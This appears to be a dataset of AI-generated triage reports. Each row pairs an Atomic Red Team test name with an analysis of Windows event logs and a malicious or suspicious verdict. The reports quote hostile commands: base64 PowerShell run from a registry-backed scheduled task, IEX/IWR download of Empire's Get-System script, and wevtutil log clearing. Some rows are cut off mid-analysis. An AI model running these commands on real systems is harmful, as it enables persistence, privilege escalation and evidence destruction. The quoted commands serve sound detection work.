Scheduled task Local,"Upon reviewing the Windows event logs, several events stand out that indicate potentially malicious activity. Here is a detailed analysis:

### Suspicious Activities Identified:

1. **Clearing of Event Logs:**
   - The logs indicate that multiple event logs were cleared (Security, System, Windows PowerShell) in quick succession by the user ""admin_test"" on ""SERVER002."" Sysmon Event IDs 5 and System Log Event ID 104 provide this information.
   - Clearing event logs is a common tactic used by attackers to cover their tracks.

2. **Execution of `schtasks.exe`:**
   - Sysmon logs show the execution of `schtasks.exe` with a command to create a scheduled task named ""spawn"" that calls `cmd.exe` to execute at a specific time. This is indicative of a persistence mechanism being set up (Sysmon Event ID 1 - Process Creation). This could be an automated way to execute malicious payloads.
   - The use of the ""ONCE"" switch without further explanation or legitimacy context raises suspicion.

3. **High Integrity Level and Privilege Usage:**
   - The events demonstrate processes like `wevtutil.exe`, `conhost.exe`, and `schtasks.exe` being executed with high integrity levels by the admin_test user.
   - The presence of high-level privileges (e.g., `SeDebugPrivilege`) as shown in Security Log Event ID 4672 can be indicative of an attempt at privilege escalation or misuse.

4. **Use of Command Line:**
   - Observations of command-line executions (`cmd.exe`, `wevtutil.exe`) focusing on log clearing and setting scheduled tasks are abnormal for typical user behavior, especially on a CEO machine or sensitive system without further context.

### Assessment:
Based on the identified activities:
- **Clearing of multiple event logs**
- **Creation of suspicious scheduled tasks**
- **Use of command-line utilities typical in scripts or attacks (e.g., `wevtutil.exe`, `schtasks.exe`)**

These activities collectively present anomalous behaviors that deviate from normal operational procedures for a legitimate user, suggesting a potential security breach or malicious activity. The logs suggest actions intended to disrupt system monitoring and establish unauthorized access mechanisms.

Process Injection with Go using CreateThread WinAPI,"Upon reviewing the provided Windows event logs, several indicators of potentially malicious activity and misconfigurations stand out. Below is a detailed analysis of the suspicious activities identified across different logs:

### Key Findings:

1. **Event Log Clearing:**
   - **Security and System EventIDs 1102 (Security log cleared) and 104 (System log cleared):**
     - These logs indicate that the event logs for the Security and System channels were cleared by the user ""admin_test"". The event occurred at a high-integrity level, which typically indicates administrative privileges. Clearing logs can be a strong indicator of malicious activity as it is often used by attackers to cover their tracks.
  
2. **Suspicious PowerShell Activity:**
   - The PowerShell log entries show execution of a command with the application `CreateThread.exe` launched from the directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055\\bin\\x64\\`.
   - **AtomicRedTeam** is a tool used for security testing and simulating attacks. Its presence in the filesystem might indicate that the system has been subject to security tests or that an attacker may be attempting to simulate legitimate testing activities to mask real attacks.
   - The debug flag `-debug` suggests that the executable might be running in a development or diagnostic mode, often related to either testing or debugging by attackers.

3. **Process Execution with `wevtutil.exe`:**
   - Multiple instances of the eventing command line utility `wevtutil.exe` are observed, which is used to manipulate event logs including operations like clearing logs. This corresponds with the log clearing activities mentioned previously.
   - The `COMMANDLINE` arguments associated with `wevtutil.exe` suggest explicit manual clearing of the Application, Security, and PowerShell logs.

4. **Time Change Event:**
   - A time change event was captured in the Security logs (EventID 4616). While this can be benign, when combined with other suspicious activities, it may suggest an attempt to manipulate event timelines.

### Assessment:

The combination of event log clearing, usage of potentially malicious executables (`CreateThread.exe` under the AtomicRedTeam path), and execution of `wevtutil.exe` with administrative privileges strongly indicates attempts to cover tracks, simulate malicious activity, or test security boundaries. Without additional context, such as authorized security assessments or testing being conducted on the CEO's machine, these activities should be considered suspicious at the least.

### Conclusion and Next Steps:

**Resolution: SUSPICIOUS**

- **Immediate Actions:**
  - Isolate the machine to prevent lateral movement or further compromise.
  - Preserve memory and disk images for forensic analysis.
  - Validate with the IT department or security team if any legitimate security testing was scheduled or conducted.
  
- **Further Investigation:**
  - Conduct a thorough forensic analysis to determine the source and extent of the activities.
  - Review additional logs or systems associated with the user ""admin_test"" for similar patterns.
  - Assess recent changes in user permissions or configurations that could indicate privilege escalation.

- **Post-Investigation:**
  - Depending on the investigation's findings, consider implementing stricter logging and alerting for event log manipulation and unauthorized use of PowerShell scripts.
  - Strengthen endpoint monitoring with more advanced detection rules for EDR solutions, focusing on attack simulations and privilege misuse indicators.

This situation requires a deeper probe to ascertain whether these actions stem from benign internal tests or malicious external intrusions."
Remote Service Installation CMD,"Based on the provided log entries, let's analyze the activities and determine if there are indicators of malicious activities:

### Suspicious Activities:
1. **PowerShell Execution**: 
   - A PowerShell process was initiated (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by `admin_test` (event ID: 17997). PowerShell is often used for system management and scripting but can also be used for malicious activities. It's crucial to check the command used, but here it is not provided.

2. **Event Log Clearing**: 
   - The system and security logs were cleared (`EventID: 1102` for Security and `EventID: 104` for System logs). Clearing logs is a common technique used to cover tracks during or after unauthorized activities.

3. **Creation of a New Service and Execution**:
   - A suspicious service named `AtomicTestService_CMD` was created and started using `sc.exe` (events: 18027, 18028, 18029, 18031). The image path for the service is `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1543.003\bin\AtomicService.exe`, a location typically not used for legitimate Windows services.
   - The command line for `cmd.exe` included operations to create and start a service, suggesting the execution of potentially malicious activity or a penetration test without explicit permission.

4. **Processes Run by SYSTEM User**: 
   - The service `AtomicService.exe` executed under `NT AUTHORITY\SYSTEM` privileges, indicating a potential privilege escalation event or an attempt to execute tasks with high-level privileges (event ID: 18032).

5. **Tools and Commands Related to Discovery**:
   - Execution of commands like `whoami.exe` and `hostname.exe` (event IDs: 18023, 18024, 18019) which, while typically benign, in conjunction with other events, can indicate attempts to gather information about the system and user context.

### Malicious Indicators:
- The sequence of events showing the creation and execution of `AtomicTestService_CMD` combined with the modification and execution from a temporary directory points towards a potential penetration test or malicious activity driven by utility scripts found in the Atomic Red Team framework, commonly used for simulating adversary tactics.

### Assessment and Conclusion:
The presence of log-clearing activities and unusual service creation indicate potential malicious intent or unauthorized testing activities. Given the evidence, the activities fall under:

- **Resolution**: MALICIOUS

### Guidance:
1. **Immediate Actions**:
   - Investigate who authorized the execution of the `AtomicTestService_CMD`.
   - Determine if this was a part of a sanctioned penetration test or a malicious intrusion.
   - Check system integrity and security configurations to ensure no further unauthorized services or tasks are running.

2. **Reinforcement**:
   - Strengthen log monitoring to detect log clearing activities.
   - Ensure appropriate alerts and responses for service creations in non-standard directories.
   - Conduct a review of administrative credentials and their accesses, as these have been implicated in potentially unauthorized activities.

3. **Preventative Measures**:
   - Implement stricter policies on PowerShell and other scripting utilities to prevent unauthorized usage.
   - Use application whitelisting to prevent execution of applications from non-standard paths or temporary directories.

Overall, these findings suggest a breach or an unauthorized security test, requiring immediate intervention and further investigation."
Task Scheduler via VBA,"Upon analyzing the provided Windows event logs, several activities stand out as suspicious and indicative of potential malicious activity:

1. **PowerShell Activity**: The PowerShell logs show that a script from a URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`) was executed, which is an Atomic Red Team test script for simulating malicious behavior. This activity suggests the use of PowerShell to execute potentially unauthorized scripts, which can be a major indicator of compromise, as attackers often use PowerShell for its powerful scripting capability in evasive tactics.

2. **Sysmon Events**: The Sysmon logs highlight several instances of PowerShell execution originating from a user `SERVER002\\admin_test`, which aligns with the suspicious PowerShell activity logged previously. These logs further corroborate the use of PowerShell in this context.

3. **Event Log Clearing**: The logs show evidence of log clearing events:
   - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
   - `wevtutil.exe cl Application`
   - `wevtutil.exe cl System`
   - `wevtutil.exe cl Security`
   This activity is particularly concerning as it is a typical step attackers take to cover their tracks after performing malicious activities. It was executed by the same `admin_test` user, which ties back to the suspicious PowerShell activity.

4. **Scripting and Logon Activity**: The logs also contain evidence of system-level logon activity and behavior typical of privilege escalation, which further heightens the risk profile of this analysis.

**Assessment**: 
The combination of unauthorized script execution using PowerShell, evidence of critical event logs being cleared, and the user `admin_test` being involved in these actions points towards activities commonly associated with malicious intent or compromise. This activity could indicate that the system was being used for malicious purposes without authorization, potentially part of a larger attack chain.

**Resolution**: **MALICIOUS**

Given these findings, it is highly recommended to:
- Immediately isolate the affected machine (Server002) from the network to prevent further potential spread of malicious activity.
- Conduct a thorough forensic analysis of Server002 to uncover further details and ensure containment.
- Review and possibly revoke access credentials associated with the `admin_test` account.
- Communicate findings to the incident response team to initiate a coordinated response to mitigate any further risks.
- Review network activity logs for anomalies that coincide with the timestamps of these events to understand any broader impact."
Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"After analyzing the provided logs, several activities stand out as suspicious, potentially indicating malicious activity. Let me break down the observations:

### Windows PowerShell Logs
1. **Suspicious PowerShell Activity:**
   - The PowerShell command involves creating a directory in the temp path, copying `calc.exe` from `C:\Windows\System32` to the new directory, and setting a registry key in `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders` with a ""Startup"" value pointing to the new directory. 
   - This activity is suspicious because it is a common technique used by malicious actors to achieve persistence by copying a legitimate binary and using it to execute malicious code at startup.

### Security Logs
1. **Log File Clearance:**
   - The event log shows that the security logs, system logs, and Windows PowerShell logs have been cleared by the user `admin_test`. Clearing event logs is a significant red flag, as it is often a step taken by attackers to cover their tracks.
   
2. **Time Manipulation:**
   - There are events indicating changes to the system's time, which could potentially be used to manipulate timestamps on files or to avoid detection based on time-based filters in logs.

3. **Privileged Logon Sessions:**
   - The use of various high privileges such as `SeDebugPrivilege` and `SeImpersonatePrivilege` by the account `admin_test` could indicate an attempt to perform operations requiring elevated privileges. Although the account is an admin, the context within these events indicates potential misuse.

### Sysmon Logs
1. **Command-line Utility Usage:**
   - Frequent invocations of `wevtutil.exe` to clear logs across various channels (`Sysmon`, `Application`, and `System`) correlate with the manual log clearance events found in the security logs.
   
2. **PowerShell Execution Context:**
   - The `powershell.exe` process execution context and its command line arguments match suspicious activities indicating potential persistence techniques as highlighted earlier.

### Assessment and Resolution
**Assessment:**
The combination of creating a potential persistence mechanism using a legitimate executable (`calc.exe`), clearing various logs to cover tracks, manipulating system time stamps, and using high privileges indicative of potential privilege escalation or maintenance of access, all suggest a likelihood of malicious activity.

**Resolution:**
- **MALICIOUS**

**Guidance:**
1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further potential harm.
   - Perform a full disk forensic analysis on the isolated system to identify any additional indicators of compromise (e.g., unauthorized tools or additional persistence mechanisms).
   
2. **Review User Activity:**
   - Investigate the activity of the user `admin_test` to determine if credentials may be compromised or if any unauthorized actions were taken using this account.

3. **Log Monitoring and Alerting:**
   - Implement enhanced logging and alerting to detect similar behaviors in the future, including monitoring for log clearance attempts and potentially suspicious PowerShell activities.

4. **Remediation:**
   - Consider restoring the machine to a known good state from backup.
   - Rotate passwords and review permissions for the `admin_test` user.

5. **Incident Reporting:**
   - Report the findings to the organization's incident response team for further investigation and potential law enforcement engagement depending on the findings' nature and scope. 

By following these steps, the system can be secured from any ongoing threats, and measures can be implemented to prevent future occurrences."
Azure - adding user to Azure role in subscription,"The provided log entries reveal several activities on the Windows host, which merit closer examination to determine whether they signify malicious activity or otherwise suspicious behavior.

### Analysis of Log Entries

1. **Security Log (EventID: 1102) - Event Log Cleared:**
   - The security event log indicates that the event logs were cleared by the user ""admin_test"" at a specific time. Log clearing is a common tactic used by malicious actors to cover their tracks after an intrusion or unauthorized activity, which makes this activity highly suspicious.

2. **PowerShell Activities:**
   - The use of `PowerShell` for scripting in the logs, particularly commands involving Azure AD users and subscriptions, points to potentially suspicious administrative actions. The script attempts to connect to Azure with stored credentials, searches for a user named ""SuperUser,"" and assigns a new role (Reader) to this user. This kind of operation can signify unauthorized access or privilege escalation in Azure environments, which could indicate compromise.

3. **Command Line Execution of `wevtutil.exe` (Sysmon Log):**
   - The process `wevtutil.exe` is being used to clear various event logs such as ""Microsoft-Windows-Sysmon/Operational"" and ""Security"". This, coupled with the manual clearing evidenced in the security logs, suggests an attempt to remove traces of certain activities, reinforcing the suspicious nature of these tasks.

4. **CompatTelRunner.exe Execution (Sysmon & Security Logs):**
   - The `CompatTelRunner.exe` process appears multiple times in the logs. While typically a legitimate Windows component related to telemetry, its frequent invocation through command lines and relation to multiple security ID queries (EventID 4798) suggest it might be abused for privilege enumeration or similar activities by the persona SYSTEM.

5. **Other Executions:**
   - Multiple instances of executions involve legitimate system utilities (like `whoami.exe`, `hostname.exe`, and `svchost.exe`), mostly stemming from processes executed by ""admin_test."" The presence of common system utilities by itself isn't directly suspicious, but when seen alongside logs clearing, it could be indicative of reconnaissance or lateral movement activities.

### Assessment

Given the activities observed in the provided logs:
- **Log clearing** is a red flag indicating potential malicious intent.
- **Scripts** involving administrative tasks on Azure suggest privilege escalation or account manipulation.
- **Multiple `wevtutil.exe` executions** align with efforts to obfuscate actions taken on the system.

### Conclusion

The log activities denote a high probability of malicious operations conducted on the system. The evidence points to concerted efforts to manipulate Azure roles using PowerShell scripts and clean up event logs to cover this activity.

**Resolution:** **MALICIOUS**

### Recommendation

1. **Immediate Response:**
   - Isolate the affected machine from the network to prevent further unauthorized access.
   - Review Azure activity logs and audit logs for the affected period.
   - Change credentials for the ""admin_test"" user and any other potentially affected users.
  
2. **Investigation:**
   - Conduct a thorough incident investigation to determine the scope and origin of the compromise.
   - Engage with a forensic analysis team, if necessary, to acquire deeper insights and maintain an evidential chain.
  
3. **Prevention:**
   - Implement stricter logging and monitoring to detect log clearing activities.
   - Educate administrators about securing scripting environments and Azure resources.
   - Consider using tools for better PowerShell logging and enhanced EDR and SIEM solutions for monitoring."
Scheduled Task Executing Base64 Encoded Commands From Registry,"In analyzing the provided Windows event logs, the main point of interest is around the behavior of a user `admin_test` and the processes initiated by this user. Here is a breakdown of key points:

1. **Log Clearing Activity:**
   - There's a series of log clearing activities performed by the user `admin_test`. In the System, Security, and PowerShell logs, events are cleared using `wevtutil.exe`. Clearing logs can be a normal administrative activity but is also a notable indicator of someone attempting to cover tracks after performing unauthorized actions.

2. **Command-Line and Scheduled Task Creation:**
   - The suspicious use of `cmd.exe` with command-line arguments to modify the registry and schedule a task is a red flag. The command:
     ```plaintext
     ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
     ```
     This command indicates that a scheduled task named ""ATOMIC-T1053.005"" is being created to execute a PowerShell script decoded from base64 stored in the registry. This technique is often used in malware delivery to execute payloads without additional files on disk, thereby avoiding detection.

3. **Processes and Execution Integrity:**
   - The use of `wevtutil.exe` for clearing logs alongside the creation of scheduled tasks linked to potentially obfuscated PowerShell commands suggests misuse of administrative capabilities. The `admin_test` account is running processes with high integrity, which indicates elevated privileges.

4. **Indicators of Possible Threat:**
   - Manipulation of scheduled tasks and registry editing for command-line execution, especially when encoded strings and PowerShell usage are involved, is associated with maintaining persistence in a system post-compromise.
   - Use of tools like `whoami.exe` to check privileges is often seen when adversary wants to confirm their access level after compromise.

**Assessment:**
The combination of log-clearing activities, registry manipulations with base64 encoded commands, and persistent scheduled tasks suggests potentially malicious activity performed by the `admin_test` account on `Server002`. This behavior aligns closely with tactics used by attackers to maintain persistence and evade detection post-compromise.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
1. **Immediate Actions:**
   - Investigate the `admin_test` account for any signs of compromise or unauthorized access.
   - Isolate the affected system to prevent potential lateral movement within the network.
   
2. **Forensic Collection:**
   - Capture a memory dump and collect logs for further forensic analysis. Focus on identifying any additional indicators of compromise within the broader network.

3. **Scheduled Task Analysis:**
   - Review the implications of the ""ATOMIC-T1053.005"" scheduled task. Decode and analyze any scripts or commands that have been run.

4. **Review User Activity:**
   - Check recent actions related to users with administrative privileges and determine if credentials have been abused or leaked.

5. **Strengthen Security Posture:**
   - Implement additional monitoring for similar suspicious activities. Ensure all systems follow the principle of least privilege and enforce strong access controls.

Taking these steps will help mitigate the identified threat, ensure similar activities are detected swiftly in the future, and maintain the integrity and security of the network."
Domain Password Policy Check: No Special Character in Password,"Upon analyzing the Windows event logs provided, several points of concern have been noted that may indicate malicious activities:

1. **Log Clearing**:
   - The Windows event logs indicate multiple instances of log files being cleared (`EventID 104` for System and PowerShell logs and `EventID 1102` for Security log). This action was performed by the user `admin_test`. Clearing event logs can be indicative of an attempt to remove traces of malicious activities.
   
2. **PowerShell Activity**:
   - The PowerShell event logs capture a script execution intended to change a user's password. The script checks for a credential file, compares the new password with the stored one, and attempts to change the password using `Set-ADAccountPassword`. The script also seems to catch errors related to incorrect stored passwords (`Error code: 86`).
   - The specific use of `Set-ADAccountPassword`, conditional checks, and secure password changes are inherently sensitive operations that warrant scrutiny, especially under the conditions of recent log clearance activities.

3. **Sysmon Activity**:
   - Continuous process execution of `wevtutil.exe` associated with log clearing across different log channels (Sysmon, Application, Security, and System). This highlights the direct correlation between the command-line utility and the log clearing operations noted.
   - Standard processes such as `hostname.exe` and `whoami.exe` ran within this timeframe, which could imply additional reconnaissance efforts by an unauthorized user.

4. **EDR Alert**:
   - The alert initiated on a CEO's machine suggests that the unauthorized changes or noted suspicious activities might pose a high-level risk to company assets.

5. **Normal Operations**:
   - Despite the presence of legitimate processes and installations, such as the Microsoft Edge Update, which are part of standard IT operations, the actions of log clearing and password change overshadow these benign activities.

### Conclusion

Given the evidence of log clearing, questionable PowerShell script activity, and the alert generated by the EDR system, the combined circumstances strongly suggest a potential compromise. The correlation between process execution for log clearance and subsequent suspicious activity insinuates deliberate obfuscation attempts.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Investigation**:
   - Conduct a thorough investigation of the user account `admin_test` and verify the legitimacy of the performed actions.
   - Investigate how the PowerShell script was deployed and ascertain whether it was executed by an authorized user.

2. **Forensic Analysis**:
   - Preserve all available forensic evidence, especially the event logs and pertinent system snapshots, for further analysis, potentially involving legal and compliance concerns.

3. **Incident Response**:
   - Initiate an incident response protocol, which might include isolating the compromised host for deeper analysis, checking and updating all relevant passwords, and reviewing Active Directory logs for any additional unauthorized access or changes.
   
4. **User Awareness and Training**:
   - Ensure user security awareness training emphasizes the importance of log retention and monitoring for suspicious behavior.

By addressing these points, the organization can better understand and mitigate the potential threat, safeguarding against future incidents."
Bad Potato,"After analyzing the provided logs, several indicators of potentially malicious activity have been identified:

1. **Execution of Suspicious Scripts/Processes**:
   - A PowerShell invocation (`powershell.exe`) is observed executing a script that includes launching `BadPotato.exe` through PowerShell, which is a well-known exploit for privilege escalation by exploiting a vulnerability in the Windows operating system. The script then attempts to launch and terminate `notepad.exe`.
   - The script execution is from a temporary location: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\`, which is suspicious as it could indicate a misuse of legitimate tools for malicious purposes.

2. **Clearing of Windows Event Logs**:
   - The `wevtutil.exe` command is used to clear multiple event logs, including the Security and System logs. This action is highly suspicious as attackers often clear logs to erase traces of their activities.

3. **Misuse of Built-in Windows Utilities**:
   - Utilities such as `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and `conhost.exe` were invoked. While some usage may appear benign or routine, the combination with cleared logs and the context of `BadPotato.exe` renders them highly suspect.

4. **Anomalous Process Activity**:
   - Processes like `whoami.exe` are typically used to gather information about the current user's identity and are frequently observed in post-compromise activities as attackers aim to enumerate system and user information.

5. **Behavior Indicating Potential Privilege Escalation**:
   - The presence of `BadPotato.exe` combined with PowerShell script execution and subsequent log clearance indicates attempts at privilege elevation and potential system compromise.

Given these observations, the activities recorded in the logs are indicative of malicious behavior, specifically targeting privilege escalation and covering tracks through log clearance. The focus on `BadPotato.exe` and log clearance are particularly telling indicators.

**Assessment**: MALICIOUS

**Guidance on How to Proceed**:
- **Immediate Actions**:
  - Isolate the affected machine (Server002) from the network to prevent further malicious activities.
  - Preserve forensic data for further analysis, including a memory dump and a full disk image.
  - Notify the incident response team to conduct a thorough investigation and containment.

- **Future Mitigation**:
  - Review and update endpoint protection policies to monitor for similar PowerShell activities.
  - Implement stricter audit policies to log all PowerShell execution and attempts to clear event logs.
  - Conduct user training to recognize phishing attempts and other attack vectors that could lead to initial compromise.

- **Long-term Actions**:
  - Review and harden security configurations, especially concerning PowerShell usage and script execution policies.
  - Conduct a comprehensive security assessment of existing systems to identify and patch vulnerabilities that may be exploited."
Add a driver,"Upon reviewing the provided Windows event logs, I have identified several suspicious activities that warrant further investigation:

1. **Use of `wevtutil.exe`**: Multiple executions of `wevtutil.exe` with the command to clear logs from various channels such as Application, System, Security, Windows PowerShell, and Microsoft-Windows-Sysmon. The use of `wevtutil cl` to clear logs is generally associated with activities trying to hide malicious actions.

2. **Frequent Logon Activities**: All processes, including those with elevated privileges, are executed under the account `SERVER002\\admin_test`, which has a high integrity level. This user account being very active and involved in clearing log activities is a red flag for potentially unauthorized or malicious activity.

3. **Timestamp Anomaly**: There is a kernel event (`EventID: 1`) indicating a change in the system time. The system time was adjusted backward which is often a tactic used to bypass detection systems or manipulate timestamps to hide activities.

4. **Command Line Executions**: There is an execution of `cmd.exe` launching `pnputil.exe` to add a driver, which could signify attempts to load a potentially malicious driver. This action can modify lower-level operations or exploit drivers for persistence.

5. **Log Cleared Events**: The system log indicates entries with `EventID: 104` for clearing logs, and the security log with `EventID: 1102` indicates security logs were also cleared. These events are significant because clearing logs is typically used to cover tracks after malicious activities have been performed.

In conclusion, the combination of clearing logs commands, modifications to system time, and loading drivers through command prompt strongly indicate attempts at unauthorized or malicious activity. Given these findings, the logs should be classified as **MALICIOUS**.

**Guidance on How to Proceed:**

- **Containment**: Immediately isolate the CEO's machine from the network to prevent further potential spread or data exfiltration.
- **Further Investigation**: Conduct a thorough investigation into the `admin_test` account activities and verify its legitimacy and appropriate usage.
- **Forensic Analysis**: Perform a deep forensic analysis on the affected machine to retrieve deleted logs and evidence of the malicious activity.
- **Review and Strengthen Policies**: Review and, if necessary, strengthen log retention and user activity auditing policies to prevent such incidents in the future.
- **Patch Management**: Ensure that the system is up-to-date with the latest security patches to mitigate known vulnerabilities.
- **Awareness and Training**: Provide security awareness training to the users about the dangers of unauthorized commands and actions."
Named pipe client impersonation,"Upon reviewing the provided Windows event logs, several indicators of potential malicious activity are observed:

1. **PowerShell Activity**:
    - The PowerShell logs show execution of a script downloaded from an external GitHub repository: `https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1`.
    - The script appears to be part of the BC-Security Empire framework, which is a well-known post-exploitation tool commonly used by threat actors.
    - Execution of the script indicates an attempt at privilege escalation using the Named Pipe technique, as evidenced by the `Get-System -Technique NamedPipe -Verbose` command.
    - The use of `IEX (IWR ...)` (Invoke-Expression with Invoke-WebRequest) is a known technique for downloading and executing scripts directly from the internet, which is suspicious behavior, especially on a high-value target like a CEO's machine.

2. **Security Log Events**:
    - Event ID 1102 indicates that the security event log was cleared. This is a typical indicator of malicious activity as adversaries clear event logs to cover their tracks after performing suspicious or illicit actions.
    - Event ID 4672 indicates that a user with the username ""admin_test"" received special privileges, which include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, and others. These privileges enable actions that can be utilized for malicious activity, such as interfering with protected system processes.

3. **Sysmon Log Events**:
    - Multiple instances of `wevtutil.exe cl` commands are observed in the Sysmon logs. The `wevtutil.exe` utility is being used to clear event logs (Application, Security, etc.), which matches with Event ID 1102 from the Security Logs.
    - The `whoami.exe` and `hostname.exe` executions are consistent with reconnaissance behavior, typically used to gather information about the user and system environment.

4. **System Log Events**:
    - The clearing of logs is confirmed further in the System logs with EventID 104 for System and PowerShell logs.

**Assessment and Resolution**:
- **MALICIOUS**: The activity reflected in these logs is indicative of a compromise. The execution of Empire framework code is a clear indicator of a breach. The clearing of event logs is an attempt to erase evidence and demonstrates malicious intent. Combined with the privilege escalation attempt and the nature of the processes executed, it strongly suggests that adversaries accessed the system with malicious intent.

**Guidance**:
- Immediate incident response should be initiated. The system should be isolated from the network to prevent any further potential actions by the attacker.
- Conduct a full forensic investigation of the CEO's machine to identify the full scope of the intrusion and any potential impact.
- Analyze network logs to identify any data exfiltration or command and control communications.
- Identify and close any vulnerabilities that allowed access, and ensure all systems are patched and updated.
- Review user permissions and ensure the principle of least privilege is enforced across the enterprise."
RunPE via VBA,"### Detailed Analysis of Logs:

#### **Anomalous and Suspicious Events:**

1. **Clearing of Event Logs:**
   - **Security Log Cleared:** Event ID 1102 indicates that the security log was cleared by the user ""admin_test."" This event often suggests an attempt to hide unauthorized or suspicious activities. 
   - **Sysmon Log Cleared:** Process `wevtutil.exe` was used to clear Sysmon logs. The command `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational` further corroborates this. Clearing Sysmon logs is generally considered suspicious.
   - **System and PowerShell Logs Cleared:** The system logs and Windows PowerShell logs were cleared using `wevtutil.exe` as seen in Sysmon logs with Event ID 1.

2. **Unexpected PowerShell Activity:**
   - **Suspicious PowerShell Command:** A PowerShell script execution using the `Invoke-MalDoc` function with a suspicious script downloaded via `iwr` (Invoke-WebRequest) from a GitHub URL. This is typically indicative of a malicious payload or a script execution attempt that could exploit vulnerabilities within a system.

3. **High Privilege Usage:**
   - **Special Privileges Assigned:** Event ID 4672 multiple times for the user ""SYSTEM"", listing privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are highly sensitive and normally reserved for administrative operations.

4. **Credential Access:**
   - **Access Credentials Reading Attempts:** Event ID 5379 shows failed credential access attempts with return code `3221226021`. This points towards attempts to access specific credential objects which failed, potentially indicating attempts to gather credential data.

Reg Key RunOnce,"Based on the provided event logs, here's my analysis focusing on potential indicators of malicious activity:

### Anomalies and Suspicious Activities:

1. **Event Log Clearance:**
   - Multiple instances of event logs being cleared are present, as indicated by the Security Event ID 1102 and System Event ID 104. The ""admin_test"" user cleared Security, Sysmon, Application, System, and Windows PowerShell logs within a very short time frame.
   - Clearing of logs can indicate an attempt to cover tracks, typical of malicious activity, especially when combined with other suspicious actions.

2. **Time Change Events:**
   - Multiple 4616 Event IDs from Security Auditing and System logs show the system time being modified. Time changes can often be used in combination with malicious activities to bypass detection mechanisms or revert timestamps.

3. **Use of `wevtutil.exe`:**
   - The process `wevtutil.exe` was used to clear event logs (""cl <channel>""), which is an uncommon activity unless explicitly part of system administration tasks. The frequent use and its association with the same user ""admin_test"" underlines suspicious behavior.

4. **Suspicious Command Line Execution:**
   - There is an execution of `cmd.exe` with a registry modification (`REG ADD`) involving a DLL path `C:\Path\AtomicRedTeam.dll`. This particular commandline could indicate a possible persistence mechanism or a setup for executing malicious payload through the RunOnceEx registry key.

5. **Process Creation:**
   - Creation of processes such as `whoami.exe`, `hostname.exe`, and Microsoft Edge update-related executables. While benign in isolation, in context, they may indicate reconnaissance activities or execution of scheduled updates under a potentially compromised account.

### Assessment:

The cumulative appearance of the above activities—log file clearing, system time modification, and suspicious command line executions—strongly suggests intentional malicious activity. Specifically, the deliberate clearing of event logs, possibly covering tracks after executing reconnaissance and persistence activities, is particularly concerning.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

- **Immediate Actions:**
  - Isolate the affected system (Server002) to prevent further potential spread or damage.
  - Initiate a comprehensive forensic investigation to understand the full scope of the compromise.
  - Review and monitor recent changes to critical files or configurations and analyze user activity, particularly the ""admin_test"" account.

- **Corrective Measures:**
  - Change all relevant passwords for user accounts, especially for administrative accounts.
  - Reconfigure auditing policies to ensure log tampering is detected earlier.
  - Implement additional layers of security to monitor activities and system calls.

- **Follow-Up:**
  - Analyze other systems for similar indicators of compromise.
  - Conduct an organization-wide security awareness refresh emphasizing detection and response.

These steps are crucial to securing the environment against further or future malicious activities."
EXO - Full access mailbox permission granted to a user,"Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity have been identified, highlighting a sequence of actions that raise concerns:

1. **Event Log Clearing:**
   - The Security log (Event ID 1102) and Sysmon log (Event ID 5) show that the event logs were cleared using the command `wevtutil.exe cl`. The clearing of logs is commonly associated with malicious intent, as attackers often clear logs to erase traces of their actions.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs exhibit the execution of a script that imports the `ExchangeOnlineManagement` module and manipulates mailbox permissions (`Add-MailboxPermission`) to grant full access to a mailbox (`delegate@contoso.com`) to another account (`operator@contoso.com`). Using hardcoded credentials in scripts, like `$secure_pwd = ""o365_password_test""`, is against best security practices, potentially indicating unauthorized access or misuse.

3. **High Privilege Access and Execution:**
   - The user `admin_test` has high integrity level access, and this user executed multiple instances of `wevtutil.exe` (as shown in the Sysmon logs) to clear various logs, all of which were run with high-level privileges (process integrity level: High). This suggests potential privilege abuse.

4. **Process Execution Details:**
   - The execution of `whoami.exe` and `hostname.exe` could be associated with reconnaissance activities where an attacker verifies the system context and the privileges granted.

5. **Sequential Log Clearance:**
   - The timing of events indicates that log-clearing operations were conducted sequentially across different channels (e.g., System, Security, Windows PowerShell), which aligns with attempts to cover tracks.

Based on these observations, the actions performed on the system, particularly log clearing and suspicious PowerShell execution with unauthorized mail access modifications, strongly suggest malicious activity or severe security policy violations.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately isolate the affected system to prevent further potential unauthorized activity.
- Conduct a full security assessment and forensic analysis to identify how the malicious activities were initiated.
- Check for other compromised systems within the network and determine the scope of the attack.
- Review and harden security policies, especially those concerning the use of administrative accounts and PowerShell scripts.
- Reinforce logging and monitoring mechanisms to ensure that similar attempts are detected early in the future."
Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs,"Upon reviewing the provided logs, I have identified several indicators of potentially malicious activity. Below is a detailed assessment of these indicators:

### Suspicious Behavior:

1. **Clearing of Event Logs:**
